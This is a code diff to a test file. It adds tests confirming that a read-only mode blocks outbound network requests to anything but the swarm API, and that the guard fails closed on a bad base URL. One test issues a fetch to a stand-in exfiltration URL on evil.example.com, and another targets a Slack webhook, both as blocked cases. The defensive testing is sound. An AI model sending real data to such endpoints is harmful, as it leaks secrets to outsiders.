@@ -1,5 +1,6 @@
-import { describe, expect, test } from "bun:test";
+import { afterEach, describe, expect, test } from "bun:test";
 import type { SwarmConfigPayload } from "../scripts-runtime/executors/types";
+import { patchFetchForReadOnly } from "../scripts-runtime/readonly-egress";
 import { Redacted } from "../scripts-runtime/redacted";
 import { SwarmConfig } from "../scripts-runtime/swarm-config";
 import { createSwarmSdk } from "../scripts-runtime/swarm-sdk";
@@ -68,5 +69,31 @@ describe("read-only SDK surface (routing dry-run)", () => {
     // No rejection wrapper at all — the guard is strictly opt-in, so the normal
     // routing path is unaffected.
     expect(new SwarmConfig(payload).readOnly).toBe(false);
+  });
+});
+
+describe("read-only network egress (routing dry-run)", () => {
+  const ORIGINAL_FETCH = globalThis.fetch;
+  afterEach(() => {
+    globalThis.fetch = ORIGINAL_FETCH;
+  });
+
+  test("blocks egress to anything but the swarm API", async () => {
+    patchFetchForReadOnly("http://localhost:3013");
+    await expect(globalThis.fetch("https://evil.example.com/exfil")).rejects.toThrow(
+      /blocked in read-only mode/,
+    );
+    // Credential stripping alone doesn't help against a handler that carries
+    // its own token, which is why this layer exists.
+    await expect(globalThis.fetch("https://hooks.slack.com/services/T/B/xxx")).rejects.toThrow(
+      /blocked in read-only mode/,
+    );
+  });
+
+  test("fails closed on an unparseable base URL", async () => {
+    patchFetchForReadOnly("not a url");
+    await expect(globalThis.fetch("http://localhost:3013/api/heartbeat")).rejects.toThrow(
+      /blocked in read-only mode/,
+    );
   });
 });
